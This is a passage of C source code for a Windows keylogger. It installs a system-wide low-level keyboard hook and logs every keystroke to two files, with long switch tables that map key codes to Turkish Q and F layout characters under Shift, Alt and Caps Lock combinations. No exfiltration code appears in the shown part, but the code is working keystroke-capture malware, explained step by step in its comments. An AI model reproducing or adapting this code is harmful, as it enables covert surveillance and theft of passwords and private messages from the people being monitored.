                case 0x33: /* VK_3 */
                    fputs("#", pTQLogFile);
                    fputs("#", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x34: /* VK_4 */
                    fputs("$", pTQLogFile);
                    fputs("¼", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x35: /* VK_5 */
                    fputs("½", pTQLogFile);
                    fputs("½", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x36: /* VK_6 */
                    fputs("6", pTQLogFile);
                    fputs("¾", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x37: /* VK_7 */
                    fputs("{", pTQLogFile);
                    fputs("{", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x38: /* VK_8 */
                    fputs("[", pTQLogFile);
                    fputs("[", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x39: /* VK_9 */
                    fputs("]", pTQLogFile);
                    fputs("]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x41: /* VK_A */
                    fputs("Æ", pTQLogFile);
                    fputs("A", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x42: /* VK_B */
                    fputs("B", pTQLogFile);
                    fputs("×", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x43: /* VK_C */
                    fputs("C", pTQLogFile);
                    fputs("C", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x44: /* VK_D */
                    fputs("D", pTQLogFile);
                    fputs("¥", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x45: /* VK_E */
                    fputs("€", pTQLogFile);
                    fputs("€", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x46: /* VK_F */
                    fputs("F", pTQLogFile);
                    fputs("@", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x47: /* VK_G */
                    fputs("G", pTQLogFile);
                    fputs("G", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x48: /* VK_H */
                    fputs("H", pTQLogFile);
                    fputs("Ø", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x49: /* VK_I */
                    fputs("i", pTQLogFile);
                    fputs("¶", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4A: /* VK_J */
                    fputs("J", pTQLogFile);
                    fputs("«", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4B: /* VK_K */
                    fputs("K", pTQLogFile);
                    fputs("K", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4C: /* VK_L */
                    fputs("L", pTQLogFile);
                    fputs("L", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4D: /* VK_M */
                    fputs("M", pTQLogFile);
                    fputs("M", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4E: /* VK_N */
                    fputs("N", pTQLogFile);
                    fputs("N", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4F: /* VK_O */
                    fputs("O", pTQLogFile);
                    fputs("O", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x50: /* VK_P */
                    fputs("P", pTQLogFile);
                    fputs("£", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x51: /* VK_Q */
                    fputs("@", pTQLogFile);
                    fputs("¨", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x52: /* VK_R */
                    fputs("R", pTQLogFile);
                    fputs("R", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x53: /* VK_S */
                    fputs("ß", pTQLogFile);
                    fputs("µ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x54: /* VK_T */
                    fputs("[T/TL]", pTQLogFile);
                    fputs("[T/TL]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x55: /* VK_U */
                    fputs("U", pTQLogFile);
                    fputs("Æ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x56: /* VK_V */
                    fputs("V", pTQLogFile);
                    fputs("¢", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x57: /* VK_W */
                    fputs("W", pTQLogFile);
                    fputs("~", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x58: /* VK_X */
                    fputs("X", pTQLogFile);
                    fputs("`", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x59: /* VK_Y */
                    fputs("Y", pTQLogFile);
                    fputs("´", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x5A: /* VK_Z */
                    fputs("Z", pTQLogFile);
                    fputs("Z", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6A: /* VK_MULTIPLY */
                    fputs("*", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6B: /* VK_ADD */
                    fputs("+", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6D: /* VK_SUBTRACT */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6F: /* VK_DIVIDE */
                    fputs("/", pTQLogFile);
                    fputs("/", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBA: /* VK_OEM_1 */
                    fputs("´", pTQLogFile);
                    fputs("Ð", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBB: /* VK_OEM_PLUS */
                    //fputs("", pTQLogFile); /* Doesn't exists in TRQ. */
                    fputs("\\", pTFLogFile); /* Only TRF. (Escape Seq.) */
                    fnAllFileStreamsCloser(); break;
                case 0xBC: /* VK_OEM_COMMA */
                    fputs("`", pTQLogFile);
                    fputs("[Soft Hyphen-]­", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBD: /* VK_OEM_MINUS */
                    fputs("|", pTQLogFile);
                    fputs("|", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBE: /* VK_OEM_PERIOD */
                    fputs(".", pTQLogFile);
                    fputs("÷", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBF: /* VK_OEM_2 */
                    fputs("Ö", pTQLogFile);
                    fputs("Ç", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xC0: /* VK_OEM_3 */
                    fputs("<", pTQLogFile);
                    fputs("¬", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDB: /* VK_OEM_4 */
                    fputs("¨", pTQLogFile);
                    fputs("§", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDC: /* VK_OEM_5 */
                    fputs("Ç", pTQLogFile);
                    fputs("»", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDD: /* VK_OEM_6 */
                    fputs("~", pTQLogFile);
                    fputs("Ü", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDE: /* VK_OEM_7 */
                    fputs("Ý", pTQLogFile);
                    fputs("Þ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDF: /* VK_OEM_8 */
                    fputs("\\", pTQLogFile); /* Only TRQ. */
                    //fputs("\\", pTFLogFile); /* Doesn't exists in TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xE2: /* VK_OEM_102 */
                    fputs("|", pTQLogFile);
                    fputs("|", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                }
            }
        }
        else /* ALT (NO CAPS LOCK) */
        {
            if((GetAsyncKeyState(VK_RSHIFT) ||
                GetAsyncKeyState(VK_LSHIFT))) /* ALT (NO CAPS LOCK) + SHIFT */
            {
                switch(vkCode)
                {
                case 0x03: /* VK_CANCEL */
                    fputs("[0x03]", pTQLogFile);
                    fputs("[0x03]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x08: /* VK_BACK */
                    fputs("[Backspace]", pTQLogFile);
                    fputs("[Backspace]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x09: /* VK_TAB */
                    fputs("[Tab]", pTQLogFile);
                    fputs("[Tab]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x0D: /* VK_RETURN */
                    fputs("[Enter]\n", pTQLogFile);
                    fputs("[Enter]\n", pTFLogFile);
                    fnAllFileStreamsCloser();
                    fnNewLineTimerPrinter(); break;
                case 0x1B: /* VK_ESCAPE */
                    fputs("[Esc]", pTQLogFile);
                    fputs("[Esc]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x20: /* VK_SPACE */
                    fputs(" ", pTQLogFile);
                    fputs(" ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x30: /* VK_0 */
                    fputs("=", pTQLogFile);
                    fputs("=", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x31: /* VK_1 */
                    fputs("!", pTQLogFile);
                    fputs("¡", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x32: /* VK_2 */
                    fputs("'", pTQLogFile);
                    fputs("\"", pTFLogFile); /* Escape Seq. \" */
                    fnAllFileStreamsCloser(); break;
                case 0x33: /* VK_3 */
                    fputs("^", pTQLogFile);
                    fputs("³", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x34: /* VK_4 */
                    fputs("+", pTQLogFile);
                    fputs("¤", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x35: /* VK_5 */
                    fputs("%", pTQLogFile);
                    fputs("%", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x36: /* VK_6 */
                    fputs("&", pTQLogFile);
                    fputs("&", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x37: /* VK_7 */
                    fputs("/", pTQLogFile);
                    fputs("'", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x38: /* VK_8 */
                    fputs("(", pTQLogFile);
                    fputs("(", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x39: /* VK_9 */
                    fputs(")", pTQLogFile);
                    fputs(")", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x41: /* VK_A */
                    fputs("Æ", pTQLogFile);
                    fputs("ª", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x42: /* VK_B */
                    fputs("B", pTQLogFile);
                    fputs("B", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x43: /* VK_C */
                    fputs("C", pTQLogFile);
                    fputs("C", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x44: /* VK_D */
                    fputs("D", pTQLogFile);
                    fputs("D", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x45: /* VK_E */
                    fputs("E", pTQLogFile);
                    fputs("E", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x46: /* VK_F */
                    fputs("F", pTQLogFile);
                    fputs("F", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x47: /* VK_G */
                    fputs("G", pTQLogFile);
                    fputs("G", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x48: /* VK_H */
                    fputs("H", pTQLogFile);
                    fputs("Ø", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x49: /* VK_I */
                    fputs("Ý", pTQLogFile);
                    fputs("®", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4A: /* VK_J */
                    fputs("J", pTQLogFile);
                    fputs("<", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4B: /* VK_K */
                    fputs("K", pTQLogFile);
                    fputs("K", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4C: /* VK_L */
                    fputs("L", pTQLogFile);
                    fputs("L", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4D: /* VK_M */
                    fputs("M", pTQLogFile);
                    fputs("M", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4E: /* VK_N */
                    fputs("N", pTQLogFile);
                    fputs("N", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4F: /* VK_O */
                    fputs("O", pTQLogFile);
                    fputs("O", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x50: /* VK_P */
                    fputs("P", pTQLogFile);
                    fputs("P", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x51: /* VK_Q */
                    fputs("Q", pTQLogFile);
                    fputs("Q", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x52: /* VK_R */
                    fputs("R", pTQLogFile);
                    fputs("R", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x53: /* VK_S */
                    fputs("S", pTQLogFile);
                    fputs("º", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x54: /* VK_T */
                    fputs("T", pTQLogFile);
                    fputs("T", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x55: /* VK_U */
                    fputs("U", pTQLogFile);
                    fputs("Æ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x56: /* VK_V */
                    fputs("V", pTQLogFile);
                    fputs("©", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x57: /* VK_W */
                    fputs("W", pTQLogFile);
                    fputs("W", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x58: /* VK_X */
                    fputs("X", pTQLogFile);
                    fputs("X", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x59: /* VK_Y */
                    fputs("Y", pTQLogFile);
                    fputs("Y", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x5A: /* VK_Z */
                    fputs("Z", pTQLogFile);
                    fputs("Z", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6A: /* VK_MULTIPLY */
                    fputs("*", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6B: /* VK_ADD */
                    fputs("+", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6D: /* VK_SUBTRACT */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6F: /* VK_DIVIDE */
                    fputs("/", pTQLogFile);
                    fputs("/", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBA: /* VK_OEM_1 */
                    fputs("´", pTQLogFile);
                    fputs("Ð", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBB: /* VK_OEM_PLUS */
                    //fputs("", pTQLogFile); /* Doesn't exists in TRQ. */
                    fputs("¿", pTFLogFile); /* Only TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xBC: /* VK_OEM_COMMA */
                    fputs("`", pTQLogFile);
                    fputs(";", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBD: /* VK_OEM_MINUS */
                    fputs("_", pTQLogFile);
                    fputs("_", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBE: /* VK_OEM_PERIOD */
                    fputs(":", pTQLogFile);
                    fputs(":", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBF: /* VK_OEM_2 */
                    fputs("Ö", pTQLogFile);
                    fputs("Ç", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xC0: /* VK_OEM_3 */
                    fputs("é", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDB: /* VK_OEM_4 */
                    fputs("Ð", pTQLogFile);
                    fputs("§", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDC: /* VK_OEM_5 */
                    fputs("Ç", pTQLogFile);
                    fputs(">", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDD: /* VK_OEM_6 */
                    fputs("Ü", pTQLogFile);
                    fputs("Ü", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDE: /* VK_OEM_7 */
                    fputs("Ý", pTQLogFile);
                    fputs("Þ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDF: /* VK_OEM_8 */
                    fputs("?", pTQLogFile); /* Only TRQ. */
                    //fputs("?", pTFLogFile); /* Doesn't exists in TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xE2: /* VK_OEM_102 */
                    fputs(">", pTQLogFile);
                    fputs("¦", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                }
            }
            else /* ALT (NO CAPS LOCK - NO SHIFT) */
            {
                switch(vkCode)
                {
                case 0x03: /* VK_CANCEL */
                    fputs("[0x03]", pTQLogFile);
                    fputs("[0x03]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x08: /* VK_BACK */
                    fputs("[Backspace]", pTQLogFile);
                    fputs("[Backspace]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x09: /* VK_TAB */
                    fputs("[Tab]", pTQLogFile);
                    fputs("[Tab]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x0D: /* VK_RETURN */
                    fputs("[Enter]\n", pTQLogFile);
                    fputs("[Enter]\n", pTFLogFile);
                    fnAllFileStreamsCloser();
                    fnNewLineTimerPrinter(); break;
                case 0x1B: /* VK_ESCAPE */
                    fputs("[Esc]", pTQLogFile);
                    fputs("[Esc]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x20: /* VK_SPACE */
                    fputs(" ", pTQLogFile);
                    fputs(" ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x30: /* VK_0 */
                    fputs("}", pTQLogFile);
                    fputs("}", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x31: /* VK_1 */
                    fputs(">", pTQLogFile);
                    fputs("¹", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x32: /* VK_2 */
                    fputs("£", pTQLogFile);
                    fputs("²", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x33: /* VK_3 */
                    fputs("#", pTQLogFile);
                    fputs("#", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x34: /* VK_4 */
                    fputs("$", pTQLogFile);
                    fputs("¼", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x35: /* VK_5 */
                    fputs("½", pTQLogFile);
                    fputs("½", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x36: /* VK_6 */
                    fputs("6", pTQLogFile);
                    fputs("¾", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x37: /* VK_7 */
                    fputs("{", pTQLogFile);
                    fputs("{", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x38: /* VK_8 */
                    fputs("[", pTQLogFile);
                    fputs("[", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x39: /* VK_9 */
                    fputs("]", pTQLogFile);
                    fputs("]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x41: /* VK_A */
                    fputs("æ", pTQLogFile);
                    fputs("a", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x42: /* VK_B */
                    fputs("b", pTQLogFile);
                    fputs("×", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x43: /* VK_C */
                    fputs("c", pTQLogFile);
                    fputs("c", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x44: /* VK_D */
                    fputs("d", pTQLogFile);
                    fputs("¥", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x45: /* VK_E */
                    fputs("€", pTQLogFile);
                    fputs("€", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x46: /* VK_F */
                    fputs("f", pTQLogFile);
                    fputs("@", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x47: /* VK_G */
                    fputs("g", pTQLogFile);
                    fputs("g", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x48: /* VK_H */
                    fputs("h", pTQLogFile);
                    fputs("ø", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x49: /* VK_I */
                    fputs("i", pTQLogFile);
                    fputs("¶", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4A: /* VK_J */
                    fputs("j", pTQLogFile);
                    fputs("«", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4B: /* VK_K */
                    fputs("k", pTQLogFile);
                    fputs("k", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4C: /* VK_L */
                    fputs("l", pTQLogFile);
                    fputs("l", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4D: /* VK_M */
                    fputs("m", pTQLogFile);
                    fputs("m", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4E: /* VK_N */
                    fputs("n", pTQLogFile);
                    fputs("n", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4F: /* VK_O */
                    fputs("o", pTQLogFile);
                    fputs("o", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x50: /* VK_P */
                    fputs("p", pTQLogFile);
                    fputs("£", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x51: /* VK_Q */
                    fputs("@", pTQLogFile);
                    fputs("¨", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x52: /* VK_R */
                    fputs("r", pTQLogFile);
                    fputs("r", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x53: /* VK_S */
                    fputs("ß", pTQLogFile);
                    fputs("µ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x54: /* VK_T */
                    fputs("[t/TL]", pTQLogFile);
                    fputs("[t/TL]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x55: /* VK_U */
                    fputs("u", pTQLogFile);
                    fputs("æ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x56: /* VK_V */
                    fputs("v", pTQLogFile);
                    fputs("¢", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x57: /* VK_W */
                    fputs("w", pTQLogFile);
                    fputs("~", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x58: /* VK_X */
                    fputs("x", pTQLogFile);
                    fputs("`", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x59: /* VK_Y */
                    fputs("y", pTQLogFile);
                    fputs("´", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x5A: /* VK_Z */
                    fputs("z", pTQLogFile);
                    fputs("z", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6A: /* VK_MULTIPLY */
                    fputs("*", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6B: /* VK_ADD */
                    fputs("+", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6D: /* VK_SUBTRACT */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6F: /* VK_DIVIDE */
                    fputs("/", pTQLogFile);
                    fputs("/", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBA: /* VK_OEM_1 */
                    fputs("´", pTQLogFile);
                    fputs("ð", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBB: /* VK_OEM_PLUS */
                    //fputs("", pTQLogFile); /* Doesn't exists in TRQ. */
                    fputs("\\", pTFLogFile); /* Only TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xBC: /* VK_OEM_COMMA */
                    fputs("`", pTQLogFile);
                    fputs("[Soft Hyphen-]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBD: /* VK_OEM_MINUS */
                    fputs("|", pTQLogFile);
                    fputs("|", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBE: /* VK_OEM_PERIOD */
                    fputs(".", pTQLogFile);
                    fputs("÷", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBF: /* VK_OEM_2 */
                    fputs("ö", pTQLogFile);
                    fputs("ç", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xC0: /* VK_OEM_3 */
                    fputs("<", pTQLogFile);
                    fputs("¬", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDB: /* VK_OEM_4 */
                    fputs("¨", pTQLogFile);
                    fputs("ß", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDC: /* VK_OEM_5 */
                    fputs("ç", pTQLogFile);
                    fputs("»", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDD: /* VK_OEM_6 */
                    fputs("~", pTQLogFile);
                    fputs("ü", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDE: /* VK_OEM_7 */
                    fputs("i", pTQLogFile);
                    fputs("þ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDF: /* VK_OEM_8 */
                    fputs("\\", pTQLogFile); /* Only TRQ. */
                    //fputs("\\", pTFLogFile); /* Doesn't exists in TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xE2: /* VK_OEM_102 */
                    fputs("|", pTQLogFile);
                    fputs("|", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                }
            }

        }
    }
    fnAllFileStreamsCloser(); break;
    default:

        /*************************************************************************/
        /* Closes open file streams. */

        /* Version like two line below, throws "fclose() ambigous" error! */
        //fclose(pTQLogFile);
        //fclose(pTFLogFile);

        /* Use this! */
        fnAllFileStreamsCloser();

        /*
         * Passes the hook information to the next hook procedure
         * in the current hook chain.
         *
         * 1st Parameter hhk - Optional
         *
         * 2nd Parameter nCode - The next hook procedure uses this code to
         * determine how to process the hook information.
         *
         * 3rd Parameter wParam - The wParam value passed to the
         * current hook procedure.
         *
         * 4th Parameter lParam - The lParam value passed to the
         * current hook procedure
         */

        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    /*************************************************************************/
    /* Closes open file streams. */

    /* Version like two line below, throws "fclose() ambigous" error! */
    //fclose(pTQLogFile);
    //fclose(pTFLogFile);

    /* Use this! */
    fnAllFileStreamsCloser();

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/
/* Function called by keyboard thread init function to install hook. */

DWORD WINAPI fnKeyboardHook(LPVOID lpParameter)
{
    HHOOK hKeyHook;

    /*
     * Retrieves a module handle for the specified module.
     *
     * Parameter is NULL, GetModuleHandle returns a handle to the file used to
     * create the calling process (.exe file).
     *
     * If the function succeeds,
     * the return value is a handle to the specified module.
     *
     *If the function fails, the return value is NULL.
     */

    HINSTANCE hExe = GetModuleHandle(NULL);
    if(hExe == NULL)
    {
        return 1;
    }
    else
    {
        /*
         * Installs an application-defined hook procedure into a hook chain
         * 
         * 1st Parameter idHook: WH_KEYBOARD_LL -
         * The type of hook procedure to be installed.
         * Installs a hook procedure that monitors low-level
         * keyboard input events.
         * 
         * 2nd Parameter lpfn: fnKeyboardCallback -
         * A pointer to the hook procedure.
         * 
         * 3rd Parameter hMod: hExe -
         * A handle to the DLL containing the hook procedure pointed to by the
         * lpfn parameter.
         * 
         * 4th Parameter dwThreadId: 0 -
         * The hook procedure is associated with all existing threads running.
         * 
         * If the function succeeds, the return value is the handle to the
         * hook procedure.
         * 
         * If the function fails, the return value is NULL.
         */

        hKeyHook = SetWindowsHookEx
        (WH_KEYBOARD_LL, (HOOKPROC)fnKeyboardCallback, hExe, 0);
        /*
         * Defines a system-wide hot key of alt+ctrl+9
         * 
         * 1st Parameter hWnd(optional) :NULL -
         * A handle to the window that will receive hot key message generated
         * by hot key.
         * 
         * 2nd Parameter id:1 - The identifier of the hot key
         * 
         * 3rd Parameter fsModifiers: MOD_ALT | MOD_CONTROL -
         * The keys that must be pressed in combination with the key
         * specified by the uVirtKey parameter in order to generate
         * the WM_HOTKEY message.
         * 
         * 4th Parameter vk: 0x39(9) - The virtual-key code of the hot key
         */
        
         //RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);

        MSG msg;

        /*
         * Message loop retrieves messages from the thread's message queue and
         * dispatches them to the appropriate window procedures.
         * For more info:
         * http://msdn.microsoft.com/en-us/library/ms644928%28v=VS.85%29.aspx#creating_loop
         * 
         * Retrieves a message from the calling thread's message queue.
         */

        while(GetMessage(&msg, NULL, 0, 0) != 0)
        {
            ///* If Hot key combination is pressed, then exit. */
            //if(msg.message == WM_HOTKEY)
            //{
            //    UnhookWindowsHookEx(hMouseHook);
            //    return 0;
            //}

            /* Translates virtual-key messages into character messages. */
            TranslateMessage(&msg);
            /* Dispatches a message to a window procedure. */
            DispatchMessage(&msg);

            //Sleep(5);
        }

        /*
         * To free system resources associated with the hook and
         * removes a hook procedure installed in a hook chain
         * Parameter hhk: hKeyHook - A handle to the hook to be removed.
         */

        UnhookWindowsHookEx(hKeyHook);
    }
    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnKeyboardThreadInit(char* argv[])
{
    HANDLE hKeyboardThread;
    /* DWORD dwThread; */

    /*
     * CreateThread function Creates a thread to execute within the virtual
     * address space of the calling process.
     * 
     * 1st Parameter lpThreadAttributes:  NULL - Thread gets a default
     * security descriptor.
     * 
     * 2nd Parameter dwStackSize:  0  - The new thread uses the default size
     * for the executable.
     * 
     * 3rd Parameter lpStartAddress:  fnKeyboardHook - A pointer to the
     * application-defined function to be executed by the thread
     * 
     * 4th Parameter lpParameter:  argv[0] -  A pointer to a variable
     * to be passed to the thread
     * 
     * 5th Parameter dwCreationFlags: 0 - The thread runs immediately
     * after creation.
     * 
     * 6th Parameter pThreadId(out parameter): NULL - the thread identifier is
     * not returned
     * 
     * If the function succeeds, the return value is a handle to the new thread.
     */

    hKeyboardThread =
        CreateThread
        (
            NULL, 0, (LPTHREAD_START_ROUTINE)fnKeyboardHook,
            (LPVOID)argv[0], 0, NULL
        );
    if(hKeyboardThread)
    {
        /*
         * Waits until the specified object is in the signaled state or
